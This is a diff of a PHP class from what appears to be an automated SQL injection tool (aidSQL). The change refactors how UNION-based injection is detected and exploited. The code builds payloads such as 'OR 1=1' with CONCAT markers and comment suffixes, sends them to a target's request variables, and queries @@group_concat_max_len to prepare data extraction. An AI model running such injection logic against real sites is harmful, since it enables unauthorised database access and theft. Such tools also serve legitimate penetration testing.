@@ -14,7 +14,6 @@
 			private	$_vulnerableIndex				=	0;
 			private	$_fieldWrapping				=	NULL;
 			private	$_injection						=	NULL;
-			private	$_method							=	NULL;
 
 
 			public function injectionUnionWithConcat(){
@@ -34,11 +33,9 @@
 
 				}
 
-				$detected	=	$this->detectUnionInjection(__FUNCTION__,"CONCAT(0x7c,%value%,0x7c)");
-
-				var_dump($this->_detected);
-				die();
-				if($detected){
+				$this->detectUnionInjection("unionQuery","CONCAT(0x7c,%value%,0x7c)");
+				
+				if($this->_injection){
 
 					$this->log("FOUND UNION INJECTION WITH CONCAT",0,"light_green");
 					var_dump($this->getGroupConcatLength());
@@ -51,7 +48,7 @@
 
 			}
 
-			private function detectUnionInjection($method,$wrapping=NULL,$value=NULL){
+			private function detectUnionInjection($callback,$wrapping=NULL,$value=NULL){
 
 				$fieldPayloads		=	explode('_',$this->_config["field-payloads"]);
 				$commentPayloads	=	explode('_',$this->_config["comment-payloads"]);
@@ -86,9 +83,9 @@
 								$sql		=	$value.$space."OR".$space."1=1"."$space$payLoad$space".$queryBuilder->getSQL().$comment;
 								$queryBuilder->setSQL($sql);
 
-								if($isVulnerable	=	$this->query($queryBuilder,$requestVariable,$method)){
+								if($isVulnerable	=	$this->query($queryBuilder,$requestVariable,$callback)){
 
-									$this->_detected	=	array(
+									$this->_injection	=	array(
 																		"index"				=>	$maxFields,	
 																		"fieldValues"		=>	$iterationContainer,
 																		"requestVariable"	=>	$requestVariable,
@@ -97,7 +94,7 @@
 																		"comment"			=>	$comment,
 																		"wrapping"			=>	$wrapping,
 																		"data"				=>	$isVulnerable,
-																		"method"				=>	$method
+																		"callback"			=>	$callback
 	
 									);
 
@@ -123,13 +120,13 @@
 
 			private function unionQuery($value){
 
-				return $this->query($this->craftUnionInjection($value),$this->_detected["requestVariable"],$this->_method);
+				return $this->query($this->craftUnionInjection($value),$this->_injection["requestVariable"],$this->_injection["callback"]);
 
 			}
 
 			private function craftUnionInjection($value){
 
-				$params			=	&$this->_detected;
+				$params			=	&$this->_injection;
 	
 				$queryBuilder	=	new \aidSQL\core\QueryBuilder();
 
@@ -179,7 +176,10 @@
 			private function getGroupConcatLength(){
 
 				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");
-				return $this->query("@@group_concat_max_len");
+
+				$callback	=	$this->_injection["callback"];
+				var_dump($callback);
+				return $this->$callback("@@group_concat_max_len");
 
 			}
 
